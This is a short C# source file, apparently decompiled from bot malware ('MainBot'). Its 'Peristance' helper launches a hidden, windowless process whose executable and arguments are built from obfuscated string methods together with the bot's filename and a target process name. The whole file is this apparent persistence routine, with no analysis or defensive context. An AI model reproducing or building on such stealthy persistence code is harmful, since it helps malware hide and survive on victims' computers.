namespace Peristance
{
    using MainBot;
    using System;
    using System.Diagnostics;

    internal class PeristantHelper
    {
        public static void StartSyncronProcess()
        {
            Process process = new Process();
            process.StartInfo.FileName = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_14();
            process.StartInfo.Arguments = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_15() + Configuration.CurrentFilename + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_16() + Configuration.ProcessNames[0] + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_17();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.WaitForExit();
        }
    }
}

